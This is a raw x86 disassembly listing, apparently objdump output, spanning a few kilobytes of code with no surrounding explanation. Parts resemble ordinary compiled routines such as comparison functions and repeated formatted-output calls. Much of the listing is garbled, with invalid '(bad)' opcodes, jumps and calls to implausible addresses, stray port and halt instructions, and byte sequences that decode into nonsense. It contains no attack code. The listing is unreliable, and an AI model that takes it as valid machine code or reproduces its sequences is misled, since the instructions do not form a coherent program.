  403046:	03 00                	add    (%eax),%eax
  403048:	00 50 53             	add    %dl,0x53(%eax)
  40304b:	e8 40 85 00 00       	call   0x40b590
  403050:	8b 4d 96             	mov    -0x6a(%ebp),%ecx
  403053:	52                   	push   %edx
  403054:	50                   	push   %eax
  403055:	8b 45 73             	mov    0x73(%ebp),%eax
  403058:	e9 68 01 00 28       	jmp    0x284031c5
  40305d:	6a 00                	push   $0x0
  40305f:	83 d1 c3             	adc    $0xffffffc3,%ecx
  403062:	d9 50 03             	fsts   0x3(%eax)
  403065:	7a 00                	jp     0x403067
  403067:	51                   	push   %ecx
  403068:	50                   	push   %eax
  403069:	9a 22 bd 00 00 ca 8b 	lcall  $0x8bca,$0xbd22
  403070:	67 3e 04 50          	addr16 ds add $0x50,%al
  403074:	8b 04 3e             	mov    (%esi,%edi,1),%eax
  403077:	6a 00                	push   $0x0
  403079:	68 a5 42 0f 00       	push   $0xf42a5
  40307e:	52                   	push   %edx
  40307f:	47                   	inc    %edi
  403080:	05 0b 85 00 00       	add    $0x850b,%eax
  403085:	a8 8b                	test   $0x8b,%al
  403087:	55                   	push   %ebp
  403088:	fc                   	cld
  403089:	8d 8d 44 ff ff ff    	lea    -0xbc(%ebp),%ecx
  40308f:	e8 51 68 f0 d4       	call   0xd53098e5
  403094:	40                   	inc    %eax
  403095:	00 66 ff             	add    %ah,-0x1(%esi)
  403098:	7b 80                	jnp    0x40301a
  40309a:	99                   	cltd
  40309b:	40                   	inc    %eax
  40309c:	00 8b 45 f4 83 c4    	add    %cl,-0x3b7c0bbb(%ebx)
  4030a2:	e5 40                	in     $0x40,%eax
  4030a4:	8b 20                	mov    (%eax),%esp
  4030a6:	ac                   	lods   %ds:(%esi),%al
  4030a7:	4f                   	dec    %edi
  4030a8:	41                   	inc    %ecx
  4030a9:	00 83 c6 28 3b c1    	add    %al,-0x3ec4d73a(%ebx)
  4030af:	89 45 f4             	mov    %eax,-0xc(%ebp)
  4030b2:	0f 8c fd fe ff ff    	jl     0x402fb5
  4030b8:	8b 45 fc             	mov    -0x4(%ebp),%eax
  4030bb:	57                   	push   %edi
  4030bc:	ff a1 50 c1 91 2c    	jmp    *0x2c91c150(%ecx)
  4030c2:	83 ec 07             	sub    $0x7,%esp
  4030c5:	8b 45 08             	mov    0x8(%ebp),%eax
  4030c8:	85 c0                	test   %eax,%eax
  4030ca:	a3 08 6a 01 d2       	mov    %eax,0xd2016a08
  4030cf:	15 70 c1 40 00       	adc    $0x40c170,%eax
  4030d4:	5f                   	pop    %edi
  4030d5:	5e                   	pop    %esi
  4030d6:	5b                   	pop    %ebx
  4030d7:	87 e5                	xchg   %esp,%ebp
  4030d9:	5d                   	pop    %ebp
  4030da:	c3                   	ret
  4030db:	90                   	nop
  4030dc:	90                   	nop
  4030dd:	90                   	nop
  4030de:	90                   	nop
  4030df:	90                   	nop
  4030e0:	c9                   	leave
  4030e1:	8b ec                	mov    %esp,%ebp
  4030e3:	8b 45 08             	mov    0x8(%ebp),%eax
  4030e6:	4b                   	dec    %ebx
  4030e7:	59                   	pop    %ecx
  4030e8:	0c 56                	or     $0x56,%al
  4030ea:	8b 50 92             	mov    -0x6e(%eax),%edx
  4030ed:	8b 43 3c             	mov    0x3c(%ebx),%eax
  4030f0:	5d                   	pop    %ebp
  4030f1:	40                   	inc    %eax
  4030f2:	14 8b                	adc    $0x8b,%al
  4030f4:	49                   	dec    %ecx
  4030f5:	14 3b                	adc    $0x3b,%al
  4030f7:	c1 bf 8f 7c 04 3b d8 	sarl   $0xd8,0x3b047c8f(%edi)
  4030fe:	73 06                	jae    0x403106
  403100:	83 c8 75             	or     $0x75,%eax
  403103:	5e                   	pop    %esi
  403104:	5d                   	pop    %ebp
  403105:	c3                   	ret
  403106:	3b c1                	cmp    %ecx,%eax
  403108:	7c 0e                	jl     0x403118
  40310a:	2f                   	das
  40310b:	04 5f                	add    $0x5f,%al
  40310d:	d6                   	salc
  40310e:	e1 08                	loope  0x403118
  403110:	b8 01 00 0f 00       	mov    $0xf0001,%eax
  403115:	ce                   	into
  403116:	5c                   	pop    %esp
  403117:	c3                   	ret
  403118:	33 7f 5e             	xor    0x5e(%edi),%edi
  40311b:	5d                   	pop    %ebp
  40311c:	c3                   	ret
  40311d:	90                   	nop
  40311e:	3a 90 55 6d 3d 8b    	cmp    -0x74c292ab(%eax),%dl
  403124:	45                   	inc    %ebp
  403125:	08 8b 8c 0c 56 8b    	or     %cl,-0x74a9f374(%ebx)
  40312b:	50                   	push   %eax
  40312c:	18 8b 71 18 8b 40    	sbb    %cl,0x408b1871(%ebx)
  403132:	1c 8b                	sbb    $0x8b,%al
  403134:	49                   	dec    %ecx
  403135:	1c 3b                	sbb    $0x3b,%al
  403137:	12 7f 16             	adc    0x16(%edi),%bh
  40313a:	7c 04                	jl     0x403140
  40313c:	e7 d6                	out    %eax,$0xd6
  40313e:	37                   	aaa
  40313f:	06                   	push   %es
  403140:	83 c8 ff             	or     $0xffffffff,%eax
  403143:	5e                   	pop    %esi
  403144:	5d                   	pop    %ebp
  403145:	e7 3b                	out    %eax,$0x3b
  403147:	c1 7c b8 7f 04       	sarl   $0x4,0x7f(%eax,%edi,4)
  40314c:	3b d6                	cmp    %esi,%edx
  40314e:	33 08                	xor    (%eax),%ecx
  403150:	b8 01 82 00 00       	mov    $0x8201,%eax
  403155:	5e                   	pop    %esi
  403156:	5d                   	pop    %ebp
  403157:	c3                   	ret
  403158:	33 c0                	xor    %eax,%eax
  40315a:	5e                   	pop    %esi
  40315b:	5d                   	pop    %ebp
  40315c:	c3                   	ret
  40315d:	c6                   	(bad)
  40315e:	90                   	nop
  40315f:	fb                   	sti
  403160:	55                   	push   %ebp
  403161:	8b ec                	mov    %esp,%ebp
  403163:	8b 4d 08             	mov    0x8(%ebp),%ecx
  403166:	53                   	push   %ebx
  403167:	56                   	push   %esi
  403168:	57                   	push   %edi
  403169:	8b 71 d1             	mov    -0x2f(%ecx),%esi
  40316c:	8b 79 10             	mov    0x10(%ecx),%edi
  40316f:	8b 41 1c             	mov    0x1c(%ecx),%eax
  403172:	8b 51 14             	mov    0x14(%ecx),%edx
  403175:	55                   	push   %ebp
  403176:	f7 dd                	neg    %ebp
  403178:	c2 8b 55             	ret    $0x558b
  40317b:	0c 8b                	or     $0x8b,%al
  40317d:	7a 18                	jp     0x403197
  40317f:	8b 7b ba             	mov    -0x46(%ebx),%edi
  403182:	8b 75 14             	mov    0x14(%ebp),%esi
  403185:	31 16                	xor    %edx,(%esi)
  403187:	a2 4a 1c f1 cb       	mov    %al,0xcbf11c4a
  40318c:	77 c1                	ja     0x40314f
  40318e:	7f 18                	jg     0x4031a8
  403190:	bc 04 3b f7 73       	mov    $0x73f73b04,%esp
  403195:	08 5f 5e             	or     %bl,0x5e(%edi)
  403198:	83 48 ff 5b          	orl    $0x5b,-0x1(%eax)
  40319c:	5d                   	pop    %ebp
  40319d:	c3                   	ret
  40319e:	3b c1                	cmp    %ecx,%eax
  4031a0:	7c 10                	jl     0x4031b2
  4031a2:	26 83 53 f7 b9       	adcl   $0xffffffb9,%es:-0x9(%ebx)
  4031a7:	0a 5f 5e             	or     0x5e(%edi),%bl
  4031aa:	b8 7b 00 00 00       	mov    $0x7b,%eax
  4031af:	29 5d c3             	sub    %ebx,-0x3d(%ebp)
  4031b2:	5f                   	pop    %edi
  4031b3:	5e                   	pop    %esi
  4031b4:	33 c0                	xor    %eax,%eax
  4031b6:	5b                   	pop    %ebx
  4031b7:	5d                   	pop    %ebp
  4031b8:	c1 90 90 90 00 90 90 	rcll   $0x90,-0x6fff6f70(%eax)
  4031bf:	90                   	nop
  4031c0:	55                   	push   %ebp
  4031c1:	93                   	xchg   %eax,%ebx
  4031c2:	ec                   	in     (%dx),%al
  4031c3:	8b 45 08             	mov    0x8(%ebp),%eax
  4031c6:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  4031c9:	c8 8b 50 08          	enter  $0x508b,$0x8
  4031cd:	84 71 08             	test   %dh,0x8(%ecx)
  4031d0:	8b 40 0c             	mov    0xc(%eax),%eax
  4031d3:	8b 49 0c             	mov    0xc(%ecx),%ecx
  4031d6:	3b c1                	cmp    %ecx,%eax
  4031d8:	7f 16                	jg     0x4031f0
  4031da:	7c 04                	jl     0x4031e0
  4031dc:	3b d6                	cmp    %esi,%edx
  4031de:	73 3b                	jae    0x40321b
  4031e0:	83 c8 ff             	or     $0xffffffff,%eax
  4031e3:	5e                   	pop    %esi
  4031e4:	5d                   	pop    %ebp
  4031e5:	c3                   	ret
  4031e6:	57                   	push   %edi
  4031e7:	c1 7c 0e 7f 04       	sarl   $0x4,0x7f(%esi,%ecx,1)
  4031ec:	3b d6                	cmp    %esi,%edx
  4031ee:	76 08                	jbe    0x4031f8
  4031f0:	b8 01 d1 a5 90       	mov    $0x90a5d101,%eax
  4031f5:	92                   	xchg   %eax,%edx
  4031f6:	5d                   	pop    %ebp
  4031f7:	c3                   	ret
  4031f8:	33 c0                	xor    %eax,%eax
  4031fa:	5e                   	pop    %esi
  4031fb:	0e                   	push   %cs
  4031fc:	c3                   	ret
  4031fd:	90                   	nop
  4031fe:	90                   	nop
  4031ff:	5d                   	pop    %ebp
  403200:	55                   	push   %ebp
  403201:	de ec                	fsubrp %st,%st(4)
  403203:	b1 ec                	mov    $0xec,%cl
  403205:	40                   	inc    %eax
  403206:	28 a0 b2 d9 a4 8b    	sub    %ah,-0x745b264e(%eax)
  40320c:	0d a4 0b 41 00       	or     $0x410ba4,%eax
  403211:	53                   	push   %ebx
  403212:	8b a5 2d 4b 41 00    	mov    0x414b2d(%ebp),%esp
  403218:	3b 57 8b             	cmp    -0x75(%edi),%edx
  40321b:	3d c4 0b 39 00       	cmp    $0x390bc4,%eax
  403220:	2b c3                	sub    %ebx,%eax
  403222:	1b cf                	sbb    %edi,%ecx
  403224:	8b 15 29 17 41 00    	mov    0x411729,%edx
  40322a:	ec                   	in     (%dx),%al
  40322b:	45                   	inc    %ebp
  40322c:	c8 89 4d cc          	enter  $0x4d89,$0xcc
  403230:	2b 61 c8             	sub    -0x38(%ecx),%esp
  403233:	e6 35                	out    %al,$0x35
  403235:	36 c1 5e 00 52       	rcrl   $0x52,%ss:0x0(%esi)
  40323a:	68 ec e7 40 00       	push   $0x40e7ec
  40323f:	dc 0d 38 c2 40 3b    	fmull  0x3b40c238
  403245:	dd b0 c8 ff d6 10    	fnsave 0x10d6ffc8(%eax)
  40324b:	f0 17                	lock pop %ss
  40324d:	41                   	inc    %ecx
  40324e:	00 68 e0             	add    %ch,-0x20(%eax)
  403251:	13 41 00             	adc    0x0(%ecx),%eax
  403254:	50                   	push   %eax
  403255:	50                   	push   %eax
  403256:	a1 1e c1 41 23       	mov    0x2341c11e,%eax
  40325b:	50                   	push   %eax
  40325c:	68 a0 02 40 00       	push   $0x4002a0
  403261:	ff d6                	call   *%esi
  403263:	90                   	nop
  403264:	df 00                	filds  (%eax)
  403266:	18 41 00             	sbb    %al,0x0(%ecx)
  403269:	a2 22 55 41 00       	mov    %al,0x415522
  40326e:	8b 15 a8 0b 41 00    	mov    0x410ba8,%edx
  403274:	51                   	push   %ecx
  403275:	50                   	push   %eax
  403276:	50                   	push   %eax
  403277:	52                   	push   %edx
  403278:	68 50 e7 40 f1       	push   $0xf140e750
  40327d:	ff d6                	call   *%esi
  40327f:	8b 0d a8 0b ba 7d    	mov    0x7dba0ba8,%ecx
  403285:	33 c0                	xor    %eax,%eax
  403287:	f8                   	clc
  403288:	a1 f4 17 41 00       	mov    0x4117f4,%eax
  40328d:	f7 a1 23 9f 41 00    	mull   0x419f23(%ecx)
  403293:	50                   	push   %eax
  403294:	c9                   	leave
  403295:	51                   	push   %ecx
  403296:	68 23 e7 40 00       	push   $0x40e723
  40329b:	8b d6                	mov    %esi,%edx
  40329d:	8b 15 e4 17 41 00    	mov    0x4117e4,%edx
  4032a3:	08 f0                	or     %dh,%al
  4032a5:	17                   	pop    %ss
  4032a6:	41                   	inc    %ecx
  4032a7:	00 83 c4 44 52 50    	add    %al,0x505244c4(%ebx)
  4032ad:	ed                   	in     (%dx),%eax
  4032ae:	77 a8                	ja     0x403258
  4032b0:	0b 41 00             	or     0x0(%ecx),%eax
  4032b3:	50                   	push   %eax
  4032b4:	29 b0 e6 40 00 ff    	sub    %esi,-0xffbf1a(%eax)
  4032ba:	d6                   	salc
  4032bb:	8b 0d 50 9d b4 00    	mov    0xb49d50,%ecx
  4032c1:	b1 f0                	mov    $0xf0,%cl
  4032c3:	f4                   	hlt
  4032c4:	41                   	inc    %ecx
  4032c5:	00 8b 15 a8 0b 41    	add    %cl,0x410ba815(%ebx)
  4032cb:	00 51 50             	add    %dl,0x50(%ecx)
  4032ce:	50                   	push   %eax
  4032cf:	52                   	push   %edx
  4032d0:	9b                   	fwait
  4032d1:	58                   	pop    %eax
  4032d2:	fe                   	(bad)
  4032d3:	ac                   	lods   %ds:(%esi),%al
  4032d4:	bf ff d6 a1 18       	mov    $0x18a1d6ff,%edi
  4032d9:	c0 40 00 8b          	rolb   $0x8b,0x0(%eax)
  4032dd:	0d a8 0b 41 91       	or     $0x91410ba8,%eax
  4032e2:	f7 a1 f0 17 41 77    	mull   0x774117f0(%ecx)
  4032e8:	50                   	push   %eax
  4032e9:	50                   	push   %eax
  4032ea:	b5 e0                	mov    $0xe0,%ch
  4032ec:	08 e6                	or     %ah,%dh
  4032ee:	40                   	inc    %eax
  4032ef:	00 ff                	add    %bh,%bh
  4032f1:	d6                   	salc
  4032f2:	0e                   	push   %cs
  4032f3:	e7 cc                	out    %eax,$0xcc
  4032f5:	8b f6                	mov    %esi,%esi
  4032f7:	c8 0c 50 a1          	enter  $0x500c,$0xa1
  4032fb:	f0 17                	lock pop %ss
  4032fd:	41                   	inc    %ecx
  4032fe:	00 7b 50             	add    %bh,0x50(%ebx)
  403301:	8b 7d a8             	mov    -0x58(%ebp),%edi
  403304:	ed                   	in     (%dx),%eax
  403305:	41                   	inc    %ecx
  403306:	00 51 68             	add    %dl,0x68(%ecx)
  403309:	a8 e5                	test   $0xe5,%al
  40330b:	40                   	inc    %eax
  40330c:	00 2a                	add    %ch,(%edx)
  40330e:	d6                   	salc
  40330f:	36 15 ac 82 41 00    	ss adc $0x4182ac,%eax
  403315:	a1 02 17 96 00       	mov    0x961702,%eax
  40331a:	83 c4 54             	add    $0x54,%esp
  40331d:	52                   	push   %edx
  40331e:	50                   	push   %eax
  40331f:	50                   	push   %eax
  403320:	a1 a8 0b 41 00       	mov    0x410ba8,%eax
  403325:	50                   	push   %eax
  403326:	68 e9 e5 40 00       	push   $0x40e5e9
  40332b:	ff d6                	call   *%esi
  40332d:	8b 0d b8 02 6c 00    	mov    0x6c02b8,%ecx
  403333:	a1 1b 17 41 00       	mov    0x41171b,%eax
  403338:	4e                   	dec    %esi
  403339:	15 a8 b8 41 00       	adc    $0x41b8a8,%eax
  40333e:	57                   	push   %edi
  40333f:	50                   	push   %eax
  403340:	50                   	push   %eax
  403341:	52                   	push   %edx
  403342:	3a 5c c6 40          	cmp    0x40(%esi,%eax,8),%bl
  403346:	9c                   	pushf
  403347:	ff d6                	call   *%esi
  403349:	a1 30 02 41 00       	mov    0x410230,%eax
  40334e:	20 c4                	and    %al,%ah
  403350:	28 85 c0 fb 2b a1    	sub    %al,-0x5ed40440(%ebp)
  403356:	cc                   	int3
  403357:	02 41 00             	add    0x0(%ecx),%al
  40335a:	8b 0d c0 02 41 00    	mov    0x4102c0,%ecx
  403360:	8b 75 c4             	mov    -0x3c(%ebp),%esi
  403363:	02 41 00             	add    0x0(%ecx),%al
  403366:	50                   	push   %eax
  403367:	ec                   	in     (%dx),%al
  403368:	f0 17                	lock pop %ss
  40336a:	41                   	inc    %ecx
  40336b:	00 51 8b             	add    %dl,-0x75(%ecx)
  40336e:	0d a8 79 41 00       	or     $0x4179a8,%eax
  403373:	20 50 51             	and    %dl,0x51(%eax)
  403376:	68 b0 e4 40 00       	push   $0x40e4b0
  40337b:	ff d6                	call   *%esi
  40337d:	58                   	pop    %eax
  40337e:	07                   	pop    %es
  40337f:	18 a1 d0 02 41 00    	sbb    %ah,0x4102d0(%ecx)
  403385:	85 c0                	test   %eax,%eax
  403387:	74 2c                	je     0x4033b5
  403389:	8b 15 a8 77 41 00    	mov    0x4177a8,%edx
  40338f:	50                   	push   %eax
  403390:	a1 f0 e0 41 00       	mov    0x41e0f0,%eax
  403395:	26 50                	es push %eax
  403397:	52                   	push   %edx
  403398:	68 60 e4 40 66       	push   $0x6640e460
  40339d:	ff d6                	call   *%esi
  40339f:	65 c4 14 a1          	les    %gs:(%ecx,%eiz,4),%edx
  4033a3:	3d 02 41 da 85       	cmp    $0x85da4102,%eax
  4033a8:	c0 74 ef a1 b0       	shlb   $0xb0,-0x5f(%edi,%ebp,8)
  4033ad:	06                   	push   %es
  4033ae:	ad                   	lods   %ds:(%esi),%eax
  4033af:	00 8b f6 a8 0b 41    	add    %cl,0x410ba8f6(%ebx)
  4033b5:	00 50 a1             	add    %dl,-0x5f(%eax)
  4033b8:	9c                   	pushf
  4033b9:	17                   	pop    %ss
  4033ba:	41                   	inc    %ecx
  4033bb:	00 50 50             	add    %dl,0x50(%eax)
  4033be:	b1 68                	mov    $0x68,%cl
  4033c0:	4f                   	dec    %edi
  4033c1:	e4 40                	in     $0x40,%al
  4033c3:	0a ff                	or     %bh,%bh
  4033c5:	d6                   	salc
  4033c6:	83 36 14             	xorl   $0x14,(%esi)
  4033c9:	8b 72 94             	mov    -0x6c(%edx),%esi
  4033cc:	02 41 00             	add    0x0(%ecx),%al
  4033cf:	8b 90 02 41 00 8b    	mov    -0x74ffbefe(%eax),%edx
  4033d5:	0d a8 55 41 00       	or     $0x4155a8,%eax
  4033da:	e9 bb a1 f0 17       	jmp    0x1830d59a
  4033df:	41                   	inc    %ecx
  4033e0:	00 50 e8             	add    %dl,-0x18(%eax)
  4033e3:	51                   	push   %ecx
  4033e4:	e5 e1                	in     $0xe1,%eax
  4033e6:	e3 40                	jecxz  0x403428
  4033e8:	00 1c a4             	add    %bl,(%esp,%eiz,4)
  4033eb:	41                   	inc    %ecx
  4033ec:	60                   	pusha
  4033ed:	7e 39                	jle    0x403428
  4033ef:	e7 36                	out    %eax,$0x36
  4033f1:	13 c5                	adc    %ebp,%eax
  4033f3:	83 f8 01             	cmp    $0x1,%eax
  4033f6:	75 25                	jne    0x40341d
  4033f8:	d4 15                	aam    $0x15
  4033fa:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  4033fb:	02 e8                	add    %al,%ch
  4033fd:	00 a1 a0 02 41 00    	add    %ah,0x4102a0(%ecx)
  403403:	8b 0d a8 0b 41 00    	mov    0x410ba8,%ecx
  403409:	d5 50                	aad    $0x50
  40340b:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  40340c:	27                   	daa
  40340d:	17                   	pop    %ss
  40340e:	41                   	inc    %ecx
  40340f:	00 50 50             	add    %dl,0x50(%eax)
  403412:	51                   	push   %ecx
  403413:	25 68 fa 40 00       	and    $0x40fa68,%eax
  403418:	ff d6                	call   *%esi
  40341a:	42                   	inc    %edx
  40341b:	c4 18                	les    (%eax),%ebx
  40341d:	83 d5 60             	adc    $0x60,%ebp
  403420:	02 41 00             	add    0x0(%ecx),%al
  403423:	02 75 25             	add    0x25(%ebp),%dh
  403426:	8b 15 a4 b1 41 52    	mov    0x5241b1a4,%edx
  40342c:	a1 a0 02 41 00       	mov    0x4102a0,%eax
  403431:	02 5f 10             	add    0x10(%edi),%bl
  403434:	0b c4                	or     %esp,%eax
  403436:	00 52 50             	add    %dl,0x50(%edx)
  403439:	a1 22 17 41 00       	mov    0x411722,%eax
  40343e:	ea 50 51 0d 18 43 40 	ljmp   $0x4043,$0x180d5150
  403445:	bb ff d6 83 c4       	mov    $0xc483d6ff,%ebx
  40344a:	18 8b 15 2c 02 41    	sbb    %cl,0x41022c15(%ebx)
  403450:	00 4a 98             	add    %cl,-0x68(%edx)
  403453:	02 41 00             	add    0x0(%ecx),%al
  403456:	d0 0d a8 0b 41 00    	rorb   $1,0x410ba8
  40345c:	52                   	push   %edx
  40345d:	50                   	push   %eax
  40345e:	a1 f0 17 41 00       	mov    0x4117f0,%eax
  403463:	50                   	push   %eax
  403464:	50                   	push   %eax
  403465:	51                   	push   %ecx
  403466:	68 c0 e2 e0 00       	push   $0xe0e2c0
  40346b:	d9 c6                	fld    %st(6)
  40346d:	dd 45 c8             	fldl   -0x38(%ebp)
  403470:	82 1d 30 c2 40 00 83 	sbbb   $0x83,0x40c230
  403477:	c4 18                	les    (%eax),%ebx
  403479:	df e0                	fnstsw %ax
  40347b:	f6 c4 9f             	test   $0x9f,%ah
  40347e:	0f ff ce             	ud0    %esi,%ecx
  403481:	00 00                	add    %al,(%eax)
  403483:	00 dd                	add    %bl,%ch
  403485:	05 8a c2 40 00       	add    $0x40c28a,%eax
  40348a:	dc 75 c4             	fdivl  -0x3c(%ebp)
  40348d:	a1 f0 17 41 00       	mov    0x4117f0,%eax
  403492:	8b 15 a8 0b 41 00    	mov    0x410ba8,%edx
  403498:	a3 ec 08 dd 5d       	mov    %eax,0x5ddd08ec
  40349d:	c8 db 05 60          	enter  $0x5db,$0x60
  4034a1:	02 41 00             	add    0x0(%ecx),%al
  4034a4:	dc 0f                	fmull  (%edi)
  4034a6:	c8 dc 0d d8          	enter  $0xddc,$0xd8
  4034aa:	c2 b3 00             	ret    $0xb3
  4034ad:	dd 1c 53             	fstpl  (%ebx,%edx,2)
  4034b0:	50                   	push   %eax
  4034b1:	50                   	push   %eax
  4034b2:	1c 68                	sbb    $0x68,%al
  4034b4:	68 e2 40 00 cd       	push   $0xcd0040e2
  4034b9:	d6                   	salc
  4034ba:	df 2d 90 02 41 fb    	fildll 0xfb410290
  4034c0:	bd f0 17 91 8b       	mov    $0x8b9117f0,%ebp
  4034c5:	83 c4 a5             	add    $0xffffffa5,%esp
  4034c8:	dc 4d c8             	fmull  -0x38(%ebp)
  4034cb:	dd d2                	fst    %st(2)
  4034cd:	75 73                	jne    0x403542
  4034cf:	50                   	push   %eax
  4034d0:	a1 a8 0b 41 00       	mov    0x410ba8,%eax
  4034d5:	50                   	push   %eax
  4034d6:	68 08 e2 40 00       	push   $0x40e208
  4034db:	ff d6                	call   *%esi
  4034dd:	a1 60 02 35 00       	mov    0x350260,%eax
  4034e2:	83 c4 18             	add    $0x18,%esp
  4034e5:	85 c0                	test   %eax,%eax
  4034e7:	7e ee                	jle    0x4034d7
  4034e9:	df 2d a0 02 41 00    	fildll 0x4102a0
  4034ef:	a1 f0 f8 41 00       	mov    0x41f8f0,%eax
  4034f4:	8b 4b a8             	mov    -0x58(%ebx),%ecx
  4034f7:	0b 41 00             	or     0x0(%ecx),%eax
  4034fa:	ee                   	out    %al,(%dx)
  4034fb:	ec                   	in     (%dx),%al
  4034fc:	27                   	daa
  4034fd:	92                   	xchg   %eax,%edx
  4034fe:	4d                   	dec    %ebp
  4034ff:	c8 dd 0a 24          	enter  $0xadd,$0x24
  403503:	88 6b 51             	mov    %ch,0x51(%ebx)
  403506:	68 7c e1 40 00       	push   $0x40e17c
  40350b:	ff 47 c4             	incl   -0x3c(%edi)
  40350e:	15 a0 02 41 29       	adc    $0x294102a0,%eax
  403513:	5a                   	pop    %edx
  403514:	3d 90 02 41 00       	cmp    $0x410290,%eax
  403519:	a1 7a 02 41 00       	mov    0x41027a,%eax
  40351e:	9d                   	popf
  40351f:	0d 94 02 41 00       	or     $0x410294,%eax
  403524:	03 d7                	add    %edi,%edx
  403526:	13 c1                	adc    %ecx,%eax
  403528:	89 55 63             	mov    %edx,0x63(%ebp)
  40352b:	89 45 d6             	mov    %eax,-0x2a(%ebp)
  40352e:	a1 f0 17 ff 00       	mov    0xff17f0,%eax
  403533:	df 6d d0             	fildll -0x30(%ebp)
  403536:	8b 0d a8 0b 41 00    	mov    0x410ba8,%ecx
  40353c:	83 c4 10             	add    $0x10,%esp
  40353f:	dc 4d c8             	fmull  -0x38(%ebp)
  403542:	dd 1c 24             	fstpl  (%esp)
  403545:	44                   	inc    %esp
  403546:	50                   	push   %eax
  403547:	51                   	push   %ecx
  403548:	68 68 ac 40 c3       	push   $0xc340ac68
  40354d:	ff 26                	jmp    *(%esi)
  40354f:	83 c4 18             	add    $0x18,%esp
  403552:	19 91 33 ff 0c 55    	sbb    %edx,0x550cff33(%ecx)
  403558:	c7                   	(bad)
  403559:	89 55 e4             	mov    %edx,-0x1c(%ebp)
  40355c:	89 b3 f0 89 89 6e    	mov    %esi,0x6e8989f0(%ebx)
  403562:	89 55 e8             	mov    %edx,-0x18(%ebp)
  403565:	89 1d ec 8b 3c ac    	mov    %ebx,0xac3c8bec
  40356b:	02 fc                	add    %ah,%bh
  40356d:	00 33                	add    %dh,(%ebx)
  40356f:	db 83 c9 08 26 ff    	fildl  -0xd9f737(%ebx)
  403575:	ff 8b 7f 07 d2 89    	decl   -0x762df881(%ebx)
  40357b:	4d                   	dec    %ebp
  40357c:	d0 c7                	rol    $1,%bh
  40357e:	45                   	inc    %ebp
  40357f:	d8 ff                	fdivr  %st(7),%st
  403581:	ff                   	(bad)
  403582:	ff                   	(bad)
  403583:	ff 89 45 dc 0f 8e    	decl   -0x71f023bb(%ecx)
  403589:	c7                   	(bad)
  40358a:	23 00                	and    (%eax),%eax
  40358c:	83 8b 15 c8 0b aa 00 	orl    $0x0,-0x55f437eb(%ebx)
  403593:	83 85 42 89 55 fc 8b 	addl   $0xffffff8b,-0x3aa76be(%ebp)
  40359a:	15 ac 02 5f 00       	adc    $0x5f02ac,%eax
  40359f:	89 55 f8             	mov    %edx,-0x8(%ebp)
  4035a2:	98                   	cwtl
  4035a3:	55                   	push   %ebp
  4035a4:	fc                   	cld
  4035a5:	41                   	inc    %ecx
  4035a6:	52                   	push   %edx
  4035a7:	f8                   	clc
  4035a8:	89 55 c8             	mov    %edx,-0x38(%ebp)
  4035ab:	8b 55 fc             	mov    -0x4(%ebp),%edx
  4035ae:	3b 42 85             	cmp    -0x7b(%edx),%eax
  4035b1:	63 15 68 f9 8b 2c    	arpl   %edx,0x2c8bf968
  4035b7:	c8 3b ca 8b          	enter  $0xca3b,$0x8b
  4035bb:	b0 fc                	mov    $0xfc,%al
  4035bd:	72 09                	jb     0x4035c8
  4035bf:	8b 45 c8             	mov    -0x38(%ebp),%eax
  4035c2:	89 45 d0             	mov    %eax,-0x30(%ebp)
  4035c5:	8b 42 92             	mov    -0x6e(%edx),%eax
  4035c8:	d8 0a                	fmuls  (%edx)
  4035ca:	8b 52 04             	mov    0x4(%edx),%edx
  4035cd:	39 e0                	cmp    %esp,%eax
  4035cf:	dc 89 55 c4 b0 0d    	fmull  0xdb0c455(%ecx)
  4035d5:	7f 05                	jg     0x4035dc
  4035d7:	39 4d d8             	cmp    %ecx,-0x28(%ebp)
  4035da:	72 06                	jb     0x4035e2
  4035dc:	89 4d 94             	mov    %ecx,-0x6c(%ebp)
  4035df:	57                   	push   %edi
  4035e0:	57                   	push   %edi
  4035e1:	dc 8b 90 fc 62 52    	fmull  0x5262fc90(%ebx)
  4035e7:	fc                   	cld
  4035e8:	39 55 f4             	cmp    %edx,-0xc(%ebp)
  4035eb:	89 a7 cc 7f c8 7c    	mov    %esp,0x7cc87fcc(%edi)
  4035f1:	08 43 55             	or     %al,0x55(%ebx)
  4035f4:	63 3b                	arpl   %edi,(%ebx)
  4035f6:	05 da 77 0c 8b       	add    $0x8b0c77da,%eax
  4035fb:	55                   	push   %ebp
  4035fc:	c8 89 b3 f0          	enter  $0xb389,$0xf0
  403600:	3a 79 cc             	cmp    -0x34(%ecx),%bh
  403603:	89 55 f4             	mov    %edx,-0xc(%ebp)
  403606:	8b 55 c4             	mov    -0x3c(%ebp),%edx
  403609:	39 55 49             	cmp    %edx,0x49(%ebp)
  40360c:	7f 0d                	jg     0x40361b
  40360e:	01 05 39 4d e8 77    	add    %eax,0x77e84d39
  403614:	06                   	push   %es
  403615:	89 4d e8             	mov    %ecx,-0x18(%ebp)
  403618:	89 55 ec             	mov    %edx,-0x14(%ebp)
  40361b:	8b 55 c8             	mov    -0x38(%ebp),%edx
  40361e:	03 fa                	add    %edx,%edi
  403620:	8b 55 60             	mov    0x60(%ebp),%edx
  403623:	13 ba 8b 0e e0 03    	adc    0x3e00e8b(%edx),%edi
  403629:	d1 8b 4d fc 89 0c    	rorl   $1,0xc89fc4d(%ebx)
  40362f:	e0 8b                	loopne 0x4035bc
  403631:	55                   	push   %ebp
  403632:	e4 8b                	in     $0x8b,%al
  403634:	49                   	dec    %ecx
  403635:	04 c1                	add    $0xc1,%al
  403637:	d1 8b 4d f8 89 55    	rorl   $1,0x5589f84d(%ebx)
  40363d:	e4 8b                	in     $0x8b,%al
  40363f:	7c fc                	jl     0x40363d
  403641:	83 c2 4c             	add    $0x4c,%edx
  403644:	49                   	dec    %ecx
  403645:	89 06                	mov    %eax,(%esi)
  403647:	2d 8b 4d ab 21       	sub    $0x21ab4d8b,%eax
  40364c:	55                   	push   %ebp
  40364d:	fc                   	cld
  40364e:	0f d6                	(bad)
  403650:	4e                   	dec    %esi
  403651:	ff                   	(bad)
  403652:	fc                   	cld
  403653:	ff                   	lcall  (bad)
  403654:	da c1                	fcmovb %st(1),%st
  403656:	f4                   	hlt
  403657:	1e                   	push   %ds
  403658:	00 e3                	add    %ah,%bl
  40365a:	6a 00                	push   $0x0
  40365c:	83 0c 00 e2          	orl    $0xffffffe2,(%eax,%eax,1)
  403660:	e8 02 00 00 50       	call   0x50403667
  403665:	51                   	push   %ecx
  403666:	e8 58 32 00 00       	call   0x4068c3
  40366b:	8b 4d dc             	mov    -0x24(%ebp),%ecx
